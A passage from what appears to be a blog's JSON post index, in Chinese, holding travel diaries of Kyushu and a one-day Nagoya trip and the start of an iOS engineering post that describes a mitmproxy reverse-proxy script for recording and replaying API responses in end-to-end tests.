吃的那些全都在「安全檢查之後」出境之前，你可以左拐到吃的地方，但回來要重新檢查；一但完成出境就沒有賣吃的，只剩免稅店。一路到出境審查幾乎都沒人，安全檢查也你一人獨享。因為沒有很餓就沒有去吃的地方了，直接出境到國際線候機室。候機室、免稅店都不大，但很新並且都有 USB 充電插座；前面說的觀景平台這邊可以看到(在 2 樓的那些人就是)。沒特別買什麼，就把 Apple Watch 的 Suica 餘額花完，投了兩瓶水蜜桃水回台灣喝。12:30 準時起飛，Bye 九州、Bye 熊本。回程的飛機比較新，電影有超級瑪利歐兄弟，看完剛好到台灣；位子也沒坐滿，爽爽的一人坐一整排！下飛機的時候發現前面的人帶了一頂安全帽，是騎機車來坐飛機嗎 🤣抵達桃園機場，回家！提領行李的時候，可能因為太早托運；等了一下才來，順便實驗了 Airtag 尋找功能，行李接近的時候有叫！回台灣又在路上看到熊本熊ＸＤ(好像是玉山銀行的新卡活動)。小補充 日本公車、路面電車 搭乘經驗 整理券(上面有號碼) = 上車時候門口會有一台小機器可以抽(類似抽號碼牌) 有的路線是一口價可能就不會有整理券 如果用電子支付 (Suica) 可以不用抽整理券，但要注意金額不能扣到負 ( 跟台灣不一樣 ) 公車電車不找零，但可以先在車上的對幣機換錢(同樣在司機投錢那邊) 多半後上前下 日本公車會等人，等人坐好才開、等人下車才開；所以到站再站起來就好，不用還沒到站就擠到前面 ( 跟台灣不一樣 ) 下車就看手上的整理券號碼跟對應的車資支付：日本旅行搭公車不用怕！巴士乘車規則說明全攻略以上就是九州 10 日獨旅自由行的整個紀錄體驗，總結/Retro 已寫在前面，感謝您的閱讀。KKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應） 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。[2024 Update] 九州二訪 2024 六月份二次造訪九州 (9 日 + 2 日韓國) 從韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 10,002 Total Views Last Statistics Date: 2025-01-19 | 9,920 Views on Medium. " }, { "title": "遊記 9/11 名古屋一日快閃自由行", "url": "/posts/7b8a0563c157/", "categories": "Z 度旅行遊記", "tags": "生活, japan, nagoya, traveling, peach", "date": "2023-09-29 00:39:58 +0800", "snippet": "[遊記] 9/11 名古屋一日快閃自由行樂桃航空名古屋一日快閃機票旅(ㄒㄧㄥˊ)遊(ㄐㄩㄣ)體驗背景一日名古屋來回機票是樂桃航空推出的活動：我那時候買名古屋一日來回含機場服務費的價格是 $5,600 ， 無托運、無餐點、無指定座位 ；來回都是紅眼航班： 去程：TPE 02:25 -&gt; NGO 06:30 回程：NGO 23:15 -&gt; TPE 01:25照官方宣傳文宣， 最長...", "content": "[遊記] 9/11 名古屋一日快閃自由行樂桃航空名古屋一日快閃機票旅(ㄒㄧㄥˊ)遊(ㄐㄩㄣ)體驗背景一日名古屋來回機票是樂桃航空推出的活動：我那時候買名古屋一日來回含機場服務費的價格是 $5,600 ， 無托運、無餐點、無指定座位 ；來回都是紅眼航班： 去程：TPE 02:25 -&gt; NGO 06:30 回程：NGO 23:15 -&gt; TPE 01:25照官方宣傳文宣， 最長停留時間 16小時45分鐘 ！手提行李規定： 每人兩件 &amp; 總重小於 7 公斤手提行李規定日期： 2023/09/11、獨旅Visit Japan為了加速入境一樣直接預先填寫好入境資訊，直接用 QRCode 就能完成入境手續： 這邊停留時間填寫 1 日，在日聯絡資訊我直接填寫 名古屋中部國際機場的資訊，沒有被問，安全通過！中部國際機場資訊KKday 推廣 日本愛知｜吉トカ公園 Ghibli park 大散步高級門票＆名古屋酒店住宿｜保證入場 日本 JR PASS｜高山＆北陸地區周遊券｜多國郵寄 日本中部國際機場 NGO ⇆ 名古屋站|名鐵機場特急列車 電子車票 日本樂高樂園門票｜名古屋LEGOLAND總結(寫在前面)一日快閃是一場體力與精神的考驗；本來計劃候機或在機上睡，但是候機時間太早沒睡意，上飛機後飛機位子太小、沒排到靠窗、引擎聲很吵，沒有真的睡著，因此等於整晚都沒睡；下飛機 6:00 就開始跑名古屋行程；一度累到中午在名古屋塔的咖啡廳(安靜、沒什麼人)趴著睡了半個多小時。時間與景點有限，不太能去太遠。除了人體的電量，手機的電量也是一大考驗；我是帶 20,000 毫安時的小米行動電源才跑完全部行程的(大概來回充了 iPhone 13，4–5 次)。回台灣大約凌晨 2–3 點，沒有公共交通，只能搭計程車回台北。可以 +幾百塊 選靠窗的位置、準備頸枕、耳塞比較好睡。起程9/10 PM 22:03 — 抵達 機捷 A1 台北車站，搭乘 22:15 直達車前往第一航廈9/10 PM 10:55 — 抵達 第一航廈出境大廳來的太早，報到櫃檯 23:55 才開放（雖然沒有托運但不知道為什麼無法使用網路報到，所以還是只能等櫃檯開放）。還有一小時才開放報到，索性先回 B1 美食街找位子休息；晚上 11 點的美食街所有店面都關了(包含超商)，什麼吃的都買不到。9/11 AM 00:09 — 完成出境報到櫃檯提早開放，我 11:40 回到出境大廳就看到開始報到了；沒有托運行李、只背個包包，快速的完成報告＆安全檢查＆出境。9/11 開始，正式倒數 24 小時！9/11 AM 00:12 — 在第一航廈亂晃值得一提的是，第一航廈有免費開放的休息區貴賓室，只要照個往貴賓室的指標走就會到了；環境、位子類似咖啡廳，還有淋浴室(有開放時間 AM 6 — PM 10)；細節介紹可參考 這篇文章 。在休息區那邊其實比較好睡，因為可以趴著。。。但我那時候只有路過看了一眼就開始在機場尋找有賣吃的東西的地方(因沒飛機餐)，但可想而知時間太晚全都關了，最後只找到一台有賣餅乾的販賣機，於是買了一包義美泡芙、投了罐茶帶著。9/11 AM 00:45 — 在登機門候機來的真的太早了，候機室沒什麼人；椅子是兩個兩個一組，很難躺著睡(很醜，我拍完照就起來了)、仰著睡也不舒服、還有候機室冷氣很冷；不過那時候精神還算好，沒什麼睡意，後面時間越來越接近人也越來越多，吵雜聲越來越大，就更難睡了；因此就只有閉目養神儲存精力、翻翻日文基礎(五十音)，想說上飛機在睡一波。9/11 AM 02:14 — 完成登機飛機小延誤，本來是預計 01:55 開始登機，延誤 10 分鐘；最後我在 02:15 完成登機。9/11 AM 02:26 — 飛機起飛位子超小，在走道邊沒有頭的依靠，還好有帶頸枕加減有些支撐，但一路上引擎的轟鳴聲＋脖子的酸＝幾乎沒有睡著，就這樣一路顛波到名古屋；機上也沒有螢幕顯示飛航距離，覺得時間很漫長。 要我再選的話，我會選擇 +幾百塊 選靠窗的位置；一是頭有地方靠比較好睡、二是早上飛抵日本時能從窗戶看到日出！！9/11 AM 06:20 — 抵達 名古屋中部國際機場9/11 AM 06:35— 完成入境可能是一大早＋不需要提領行李，從飛機落地到入境只花不到 15 分鐘；但是天空不作美，名古屋正在下大雨。9/11 AM 7:03 — 候車前往名古屋市區一張是座位資訊一張是進出票(投入機器用) KKday 日本中部國際機場 NGO ⇆ 名古屋站｜名鐵機場特急列車 電子車票我是先從網路買 中部國際機場 -&gt; 名古屋鐵道單程車票＋uSky 列車 ($271)，想說來了都來了就坐看看最新最好的火車；指定座位、很穩定舒適而且是特急列車。不過如果要省錢跟方便，其實現場買準急或是直接進站搭普通車就可以了；附上列車時刻表及停留站，或直接從 名鐵網站查詢 ：第 1 個目的地： Konparu Osu コンパル 大須本店 吃炸蝦吐司需要在 金山(NH34) 就下車 改搭 名城縣 前往 上前津車站。9/11 AM 8:00 抵達 Konparu Osu コンパル 大須本店8 點開門，一大清早完全沒人，附近的大須商店街也沒有該使營業。咖啡是必須的，畢竟整晚沒睡；炸蝦吐司的蝦是真的整之下去切成的，吃得到蝦肉的 Q 彈。第 2 個目的地： 名古屋城名古屋城 9:00 開，其他景點沒那麼早開、從 上前津車站 去也順路很近，因此先去名古屋城。9/11 AM 9:02 抵達 名古屋城吃飽出發後，約莫 9:02 抵達名古屋城站。出車站發現外面正下起大雨，我沒料到日本會下雨，沒帶雨傘；附近很空曠沒看到超商，最後在名古屋城站地下街往對面名古屋市役所的 B1 找到全家超商，買了一隻雨傘繼續前往名古屋城！走進名古屋城雨勢稍緩，但是天守閣尚在維修不開放，只能參觀旁邊金碧輝煌的本丸御殿。本丸御殿進入本丸御殿要脫鞋、寄放包包(免費，但要有 $100 日幣硬幣)。第 2 個目的地： 中部電力MIRAI TOWER（原名名古屋電視塔）就在名古屋城的右下角，距離約 2 站；我走出名古屋城後搭公車前往。9/11 AM 10:08 — 抵達 中部電力MIRAI TOWER（原名名古屋電視塔）天氣時陰時晴，去的時候轉晴，離開的時候又轉陰。買票後可以上到觀景台鳥瞰名古屋市(如果只是要去中間層的咖啡廳不需買票，咖啡廳也能看到一些景觀)。咖啡廳視野，時間接近 10:30 開始睏意來襲；在這邊趴著睡到 11 點多才離開，這邊位子很多、人少、安靜…實在太適合補眠了。第 3 個目的地： 綠洲21綠洲 21 就在名古屋塔外面，但由於下雨＋平日＋早上，所以沒什麼好逛的，去繞了一下就離開了。第 4 個目的地： 矢場丼 矢場町本店時間接近中午，想說吃一下名古屋有名的味噌豬排，本店距離名古屋塔約一兩站的距離，決定用走的。第 5 個目的地： 大須商店街走到的時候發現人多要排隊…時間寶貴，因也靠近大須商店街了，就再繼續走往大須商店街覓食。9/11 PM 12:09 — 抵達 大須商店街一路往大須觀音方向走，快到大須觀音前有另一家 史場的分店 ，入內用餐。無腦的點套餐吃，想想點錯了，主要是想吃左上角的味噌豬排，套餐是 味噌豬排+炸柳葉魚+佃煮+小菜+湯+飯；味噌豬排好吃但太少吃不夠啊！第 6 個目的地： 大須觀音這家店出來就是大須觀音。9/11 PM 13:05— 抵達 大須觀音本殿維修中，只在外面逛逛就離開了。怕鳥的別來，外面鴿子很多，可以買飼料餵鴿子。第 7 個目的地： 熱田神宮再逛一次大須商店街，走回名城線，前往熱田神宮。路上買了 弁才天 水果大福來吃，皮薄嫩、水果新鮮汁多，一口氣買了兩個吃！(我覺得比 如水庵 的好吃 XD)再去商店街的藥妝簡單採購了一些可以帶上飛機的藥品帶回去台灣。9/11 PM 13:35 — 抵達 熱田神宮名城線熱田神宮站出來，要再走一段才會到熱田神宮參拜正門。簡單參拜後，買了些御守就離開了。第 8 個目的地： 名鐵名古屋 逛街最後一個點是去名鐵逛逛(其實到這邊的時候已經很累了)。9/11 PM 14:40 — 抵達 名鐵名古屋在地下街逛了一圈後往 JR GATE TOWER 走，上到 15F 的星巴克 有免費的風景可以看。因為下雨外面的位子沒開放，裡面的位子爆滿，就沒有買一杯咖啡坐下來休息觀景了；拍了照片就開始拍了幾張照片就開始往下逛高島屋百貨，樓下有 Harbs 但需要排隊。對面有一個 Sky Promenade 名古屋新的觀景台，但因為累、要再買門票、天氣不好就沒去了；查時間內還能去、有興趣的景點也沒了；最後就只一路往下逛逛到地下街買了些伴手禮(青蛙本家)；就一樣買 名古屋鐵道 -&gt; 中部國際機場 單程車票＋uSky 列車 ($271) 回機場了。時間還不到 PM 5:00 有點可惜。。。但要再去其他景點又太遠。。。又想說避開下班時間人潮。第 9 個目的地：回名古屋中部國際機場亂逛拍了一下 uSky 真身。9/11 PM 16:44 — 抵達 中部國際機場第一航廈23:15 飛機才飛，還有好長好長一段時間。先買名古屋有名的手羽先嚐嚐。NGO 機場有很多東西可以逛，除了裡面吃的喝的跟伴手禮，還有一個很大的觀景平台可以近距離看飛機起降！(第一航廈)或先去第二航廈看免費的飛機博物館（我去的時候已經關門了）。這邊還有 Lawson 跟扭蛋商店(但也是有營業時間)。9/11 PM 19:30 — 中部國際機場第一航廈 吃晚餐晚餐吃了機場的 名古屋烏龍麵 ，名古屋的特色麵條是扁的。味道不錯，但不小心點成雙主食…他的豬排是豬排飯ＸＤ吃飽繼續候機…等待櫃檯開放(20:45 開放)。9/11 PM 20:45 — 中部國際機場第一航廈 出境手續在角落咪了一下到 20:00 多時去排隊準備出境；聯航對手提行李檢查蠻嚴格的，規定就是兩件小於 7 公斤內，不會睜一隻眼閉一隻眼；有看到有人單純是去買一台 PS5 回來，好像也是個一日快閃目標的不錯選擇。9/11 PM 21:45 — 中部國際機場第一航廈 逛免稅店、候機我只有一個包包所以可以再手提一個，就順手再買了一瓶獺祭二割三分 750 ml 回台灣了。(5,700 日圓，比東京貴 100 日圓)生可樂好喝，在超市或販賣機看到可以買來嘗試看看；它是 Suntory 跟百事一起推出的，台灣買不到，用做生啤的做法作可樂，氣泡感很足，不太有糖漿的膩，我喝一般可樂喝到後面都因為太膩倒掉，但生可樂我能喝完！ 回到聯航手提行李檢查嚴格的部分，上機前會再檢查是不是只有兩件，不是的話會要你現場變成兩件或加價。9/12 AM 00:09 — 中部國際機場第一航廈 起飛因為班機延誤，原本預訂 23:15，延誤到 23:50；約 00:15 才起飛。但很幸運分配到靠窗的位置，能好好睡一波了。睡醒研究了一下機上設施，才發現航程資訊、娛樂影片，用手機連上機上 WiFi 就能查看、點餐也是可以直接用手機點。有人點類似排骨雞麵的東西在吃，整個機艙都是香味，很邪惡。9/12 AM 02:25 —抵達 桃園國際機場還好因為靠窗，在機上有補眠一下；精神還算可以。9/12 AM 03:30 抵達溫暖的台北住處不得不說台灣交通很不方便，紅眼班機到桃園機場；就只能搭可怕的一口價計程車或很貴的 Uber 回台北；如果要搭乘公共運輸只能等凌晨 4–5 點的客運。此行目的：搜集三大名城之一的名古屋城：後來才知道名古屋還有 犬山城 可以去，如果重新安排應該會先去犬山城吧、還有鰻魚飯沒吃到！KKday 推廣 日本愛知｜吉トカ公園 Ghibli park 大散步高級門票＆名古屋酒店住宿｜保證入場 日本 JR PASS｜高山＆北陸地區周遊券｜多國郵寄 日本中部國際機場 NGO ⇆ 名古屋站|名鐵機場特急列車 電子車票 日本樂高樂園門票｜名古屋LEGOLAND 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 7,351 Total Views Last Statistics Date: 2025-01-19 | 6,726 Views on Medium. " }, { "title": "POC App End-to-End Testing Local Snapshot API Mock Server", "url": "/posts/5a5c4b25a83d/", "categories": "ZRealm Dev.", "tags": "ios-app-development, end-to-end-testing, ui-testing, automation-testing, ios", "date": "2023-08-28 22:53:27 +0800", "snippet": "[POC] App End-to-End Testing Local Snapshot API Mock Server為現成 App 及現有 API 架構實現 E2E Testing 的可能性驗證Photo by freestocks前言作為一個已在線上運作多年的專案，如何持續提升穩定性是一件極具挑戰的問題。Unit TestingApp 因開發語言 Swift/Kotlin 靜態+編譯+強...", "content": "[POC] App End-to-End Testing Local Snapshot API Mock Server為現成 App 及現有 API 架構實現 E2E Testing 的可能性驗證Photo by freestocks前言作為一個已在線上運作多年的專案，如何持續提升穩定性是一件極具挑戰的問題。Unit TestingApp 因開發語言 Swift/Kotlin 靜態+編譯+強型別 或 Objective-C to Swift 動態轉靜態，在開發時沒考慮到可測試性把介面依賴切乾淨，後面要補 Unit Testing 幾乎不可能；但在重構的過程也會帶來不穩定因素，會陷入一個雞生蛋蛋生雞問題。UI Testing對 UI 交互、按鈕測試；新開發或舊有的畫面稍微解耦資料依賴就可以實現。SnapShot Testing驗證調整前後的 UI 顯示內容、樣式是否一致；同 UI Testing，新開發或舊有的畫面稍微解耦資料依賴就可以實現。用在 Storyboard/XIB 轉 Code Layout or UIView from OC to Swift 很實用；可以直接導入 pointfreeco / swift-snapshot-testing 快速實現。雖然我們可以後期補上 UI Testing、SnapShot Testing，但能涵蓋的測試範圍很有限；因為多半的錯誤不會是 UI 樣式，而是流程或是邏輯問題，導致使用者中斷操作， 如果出現在結帳流程，牽涉到營收，問題層級就很嚴重 。End-to-End Testing如前述，無法在現行專案簡易的補上單元測試也無法聚攏單元做整合測試，對於邏輯、流程的防護，還剩下從外部做 End-to-End 黑箱測試的方法，直接以使用者角度出發，操作流程檢查重要的流程(註冊/結帳…)是否正常。 對重大功能的重構也能先建立重構前的流程測試，重構後重新驗證，確保重構後功能如預期。 重構中一併補上 Unit Testing、Integration Testing 增加穩定性，打破雞生蛋蛋生雞的問題。QA TeamEnd-to-End Testing 最直接暴力的方式就是請一組 QA Team 依照 Test Plan 進行手動測試，然後再持續優化或引入自動化操作；計算了一下成本至少需要 2 位工程師 + 1 位 Leader 花費至少半年一年時間才能看到成果。評估時間與成本，有沒有什麼是現況我們能做的或是能為未來 QA Team 做好準備，當有 QA Team 時能直接跳到優化與自動化操作甚至導入 AI(?)。Automation現階段以導入自動化 End-to-End Testing 為目標，放在 CI/CD 環節自動檢查，測試內容可以不用太完整、只要能防止重大流程問題就已經很有價值了；後面再慢慢迭代 Test Plan 逐步補齊守備範圍。End-to-End Testing —技術難點UI 操作問題App 的原理比較像是透過另一個測試 App 去操作我們的被測試 App，然後從 View Hierarchy 去找尋目標物件；並且在測試時無法取得被測試 App 的 Log 或 Output，因為本質上就是兩個不同 App。iOS 需要完善 View Accessibility Identifier 增加效率與準確性還有要處理 Alert (e.g. 推播請求)。Android 在之前的實作上有遇到混用 Compose 與 Fragment 時會找不到目標物件的問題，但據 Teammate 表示，新版的 Compose 已經解決。除以上傳統常見問題外，更大的問題是雙平台難以整合(寫一個測試跑兩個平台)；目前我們在嘗試使用新的測試工具 mobile-dev-inc / maestro ：可以用 YAML 寫 Test Plan 然後在雙平台執行測試，細節使用方式、試用心得，靜待另一位 Teammate 的文章分享 cc’ed Alejandra Ts. 😝。API 資料問題對於 App E2E Testing 最大的測試變量就是 API 資料，如果無法提供保證確定的資料，會增加測試的不穩定性，導致誤報，最後大家對 Test Plan 也不再有信心了。例如測試結帳流程，如果商品有可能被下架或消失，且這些狀態改變不是 App 可控的就很有可能出現以上狀況。解決資料問題的方式有很多種，可以建立乾淨的 Staging 或 Testing 環境；或是基於 Open API 的 Auto-Gen Mock API Server；但都需要依賴後端、依賴 API 的外部因素，加上後端 API 同 App 一樣是在線上運作多年的專案，部份規格也還在重構 Migrate 暫時無法有 Mock Server。基於以上因素，如果就卡在這，那問題一樣不會改變、雞生蛋蛋生雞問題也無法突破，真的就只能「挺而走險」的直接先改、出問題再說了。Snapshot API Local Mock Server 「只要思想不滑坡，方法總比困難多」我們可以換一個想法，如果 UI 可以用 Snapshot 快照成圖片下來 Replay 進行驗證測試，那 API 是否也可以？ 我們是否可以把 API Request &amp; Response 存下來，在後續 Replay 進行驗證測試？藉此引入本篇文章的重點：建立「Snapshot API Local Mock Server」Record API Request &amp; Replay Response 剝離與 API 資料的依賴。 本文只做了 POC 概念驗證，還沒有真正全面實現高覆蓋率的 End To End Testing，因此做法僅供參考， 希望對大家在現有環境下有新的啟發 。Snapshot API Local Mock Server核心概念 — Record &amp; Replay API Data[Record] — End-to-End Testing Test Case 開發完成後，打開錄製參數，執行一次測試，過程中所有 API Request &amp; Response 會存下來放在各個 Test Case 目錄內。[Replay] — 後面在跑 Test Case 時，依照請求從 Test Case 目錄中找到對應錄製下來的 Response Data，完成測試流程。示意圖假設我們要測試加入購買流程，使用者打開 App 後在首頁點擊商品卡進入商品詳細頁，按底部購買，跳出登入匡完成登入，完成購買，跳出購買成功提示：UI Testing 如何控制按鈕點擊、輸入匡輸入…等等，不是本文主要研究重點；可參考現有的測試框架直接使用。Regular Proxy or Reverse Proxy要達成 Record &amp; Replay API 需要在 App 與 API 之間加上 Proxy 做中間人攻擊，可參考我早期的文章「 APP有用HTTPS傳輸，但資料還是被偷了。 」簡單來說就是在 App 與 API 之間多了一個代理的傳遞者，如同傳紙條一樣，雙方傳遞的請求與回應都會經過他，他可以打開來紙條的內容，也可以偽造紙條內容給彼此，雙方不會察覺你從中做梗。正向代理 Regular Proxy：正向代理是客戶端向代理伺服器發送請求，代理伺服器再將請求轉發給目標伺服器，並將目標伺服器的回應返回給客戶端。在正向代理模式下，代理伺服器代表客戶端發起請求。客戶端需要明確指定代理伺服器的位址和埠號，並將請求發送給代理伺服器。反向代理 Reverse Proxy：反向代理與正向代理相反，它位於目標伺服器和客戶端之間。客戶端向反向代理伺服器發送請求，反向代理伺服器根據一定的規則將請求轉發給後端的目標伺服器，並將目標伺服器的回應返回給客戶端。對於客戶端來說，目標伺服器看起來就像是反向代理伺服器，客戶端不需要知道目標伺服器的真實位址。對我們的需求來說正向或反向都可以達成目的，唯一要考慮的事是代理設置的方式：正向代理需要在電腦上或手機、模擬起的網路設置中掛上 Proxy 代理： Android 能在模擬器中個別直接設置 Proxy 代理 iOS Simulator 同電腦的網路環境，無法個設置 Proxy，變成要去改電腦的設置才能掛上 Proxy，電腦的所有流量也都會經過這個 Proxy 並且如果同時開啟 Proxyman 或 Charles 等等其他網路工具，有機會會強制更改 Proxy 設置成該軟體的，導致失效。反向代理需要改 Codebase 中的 API Host 並且要宣告要代理的所有 API Domains： Codebase 中的 API Host 要在測試時替換成 Proxy Server IP 在啟用 Reverse Proxy 時要宣告哪些 Domain 要掛上 Proxy 只有宣告的 Domain 才會走 Proxy，沒宣告的會直通出去 配合 iOS App，以下以 iOS &amp; 使用 Reverse Proxy 反向代理為例做 POC，Android 一樣可以使用。讓 iOS App 知道現在正在跑 End-to-End Testing我們需要讓 App 知道現在正在跑 End-to-End Testing 才能在 App 程式裡加上 API Host 替換邏輯：// UI Testing Target:let app = XCUIApplication()app.launchArguments = [\"duringE2ETesting\"]app.launch()我們在 Network 層做判斷抽換。 這是不得已的調整，盡量還是不要為了測試而去改 App 的 Code。使用 MITMProxy 實現 Reverse Proxy Server 亦可使用 Swift 自行開發 Swift Server 達成，本文只是 POC 因此直接使用 MITMProxy 工具。[2023–09–04 Update] Mitmproxy-rodo 已開源以下實作內容已經開源到 mitmproxy-rodo 專案，歡迎直接前往對照使用。部份結構與本文章內容有所調整，開源時後續調整了： 儲存目錄的結構，改為 host / requestPath / method / hash 修正 Header 資訊儲存，應該為 Bytes Data 而非純 JSON String 修正部份錯誤 增加自動延長 Set-Cookie 時效功能 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。MITMProxy照著 MITMProxy 官網 完成安裝：brew install mitmproxyMITMProxy 細節用法可參考我早期的文章「 APP有用HTTPS傳輸，但資料還是被偷了。 」 mitmproxy 提供一個互動式的命令行界面。 mitmweb 提供基於瀏覽器的圖形用戶界面。 mitmdump 提供非互動的終端輸出。實現 Record &amp; Replay因 MITMProxy Reverse Proxy 原生沒有 Record (or dump) request &amp; Mapping Request Replay 的功能，因此我們需要自行撰寫腳本實現此功能。mock.py :\"\"\"Example: Record: mitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=loginFlow --set config_file=config.json Replay: mitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=loginFlow --set config_file=config.json\"\"\"import reimport loggingimport mimetypesimport osimport jsonimport hashlibfrom pathlib import Pathfrom mitmproxy import ctxfrom mitmproxy import httpclass MockServerHandler: def load(self, loader): self.readHistory = {} self.configuration = {} loader.add_option( name=\"dumper_folder\", typespec=str, default=\"dump\", help=\"Response Dump 目錄，可以 by Test Case Name 建立\", ) loader.add_option( name=\"network_restricted\", typespec=bool, default=True, help=\"本地沒有 Mapping 資料...設置 true 會 return 404、false 會去打真實請求拿資料。\", ) loader.add_option( name=\"record\", typespec=bool, default=False, help=\"設置 true 錄製 Request's Response\", ) loader.add_option( name=\"config_file\", typespec=str, default=\"\", help=\"設置檔案路徑，範例檔案在下面\", ) def configure(self, updated): self.loadConfig() def loadConfig(self): configFile = Path(ctx.options.config_file) if ctx.options.config_file == \"\" or not configFile.exists(): return self.configuration = json.loads(open(configFile, \"r\").read()) def hash(self, request): query = request.query requestPath = \"-\".join(request.path_components) ignoredQueryParameterByPaths = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"queryParamters\", []) ignoredQueryParameterGlobal = self.configuration.get(\"ignored\", {}).get(\"global\", {}).get(\"queryParamters\", []) filteredQuery = [] if query: filteredQuery = [(key, value) for key, value in query.items() if key not in ignoredQueryParameterByPaths + ignoredQueryParameterGlobal] formData = [] if request.get_content() != None and request.get_content() != b'': formData = json.loads(request.get_content()) # or just formData = request.urlencoded_form # or just formData = request.multipart_form # depends on your api design ignoredFormDataParametersByPaths = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"formDataParameters\", []) ignoredFormDataParametersGlobal = self.configuration.get(\"ignored\", {}).get(\"global\", {}).get(\"formDataParameters\", []) filteredFormData = [] if formData: filteredFormData = [(key, value) for key, value in formData.items() if key not in ignoredFormDataParametersByPaths + ignoredFormDataParametersGlobal] # Serialize the dictionary to a JSON string hashData = {\"query\":sorted(filteredQuery), \"form\": sorted(filteredFormData)} json_str = json.dumps(hashData, sort_keys=True) # Apply SHA-256 hash function hash_object = hashlib.sha256(json_str.encode()) hash_string = hash_object.hexdigest() return hash_string def readFromFile(self, request): host = request.host method = request.method hash = self.hash(request) requestPath = \"-\".join(request.path_components) folder = Path(ctx.options.dumper_folder) / host / method / requestPath / hash if not folder.exists(): return None content_type = request.headers.get(\"content-type\", \"\").split(\";\")[0] ext = mimetypes.guess_extension(content_type) or \".json\" count = self.readHistory.get(host, {}).get(method, {}).get(requestPath, {}) or 0 filepath = folder / f\"Content-{str(count)}{ext}\" while not filepath.exists() and count &gt; 0: count = count - 1 filepath = folder / f\"Content-{str(count)}{ext}\" if self.readHistory.get(host) is None: self.readHistory[host] = {} if self.readHistory.get(host).get(method) is None: self.readHistory[host][method] = {} if self.readHistory.get(host).get(method).get(requestPath) is None: self.readHistory[host][method][requestPath] = {} if filepath.exists(): headerFilePath = folder / f\"Header-{str(count)}.json\" if not headerFilePath.exists(): headerFilePath = None count += 1 self.readHistory[host][method][requestPath] = count return {\"content\": filepath, \"header\": headerFilePath} else: return None def saveToFile(self, request, response): host = request.host method = request.method hash = self.hash(request) requestPath = \"-\".join(request.path_components) iterable = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"iterable\", False) folder = Path(ctx.options.dumper_folder) / host / method / requestPath / hash # create dir if not exists if not folder.exists(): os.makedirs(folder) content_type = response.headers.get(\"content-type\", \"\").split(\";\")[0] ext = mimetypes.guess_extension(content_type) or \".json\" repeatNumber = 0 filepath = folder / f\"Content-{str(repeatNumber)}{ext}\" while filepath.exists() and iterable == False: repeatNumber += 1 filepath = folder / f\"Content-{str(repeatNumber)}{ext}\" # dump to file with open(filepath, \"wb\") as f: f.write(response.content or b'') headerFilepath = folder / f\"Header-{str(repeatNumber)}.json\" with open(headerFilepath, \"wb\") as f: responseDict = dict(response.headers.items()) responseDict['_status_code'] = response.status_code f.write(json.dumps(responseDict).encode('utf-8')) return {\"content\": filepath, \"header\": headerFilepath} def request(self, flow): if ctx.options.record != True: host = flow.request.host path = flow.request.path result = self.readFromFile(flow.request) if result is not None: content = b'' headers = {} statusCode = 200 if result.get('content') is not None: content = open(result['content'], \"r\").read() if result.get('header') is not None: headers = json.loads(open(result['header'], \"r\").read()) statusCode = headers['_status_code'] del headers['_status_code'] headers['_responseFromMitmproxy'] = '1' flow.response = http.Response.make(statusCode, content, headers) logging.info(\"Fullfill response from local with \"+str(result['content'])) return if ctx.options.network_restricted == True: flow.response = http.Response.make(404, b'', {'_responseFromMitmproxy': '1'}) def response(self, flow): if ctx.options.record == True and flow.response.headers.get('_responseFromMitmproxy') != '1': result = self.saveToFile(flow.request, flow.response) logging.info(\"Save response to local with \"+str(result['content']))addons = [MockServerHandler()]可以自行參考 官方文件 ，依照需求調整腳本內容。此腳本設計邏輯如下： 檔案路徑邏輯： dumper_folder(a.k.a Test Case Name) / Reverse's api host / HTTP Method / Path join with - (e.g. app/launch -&gt; app-launch ) / Hash(Get Query &amp; Post Content) / 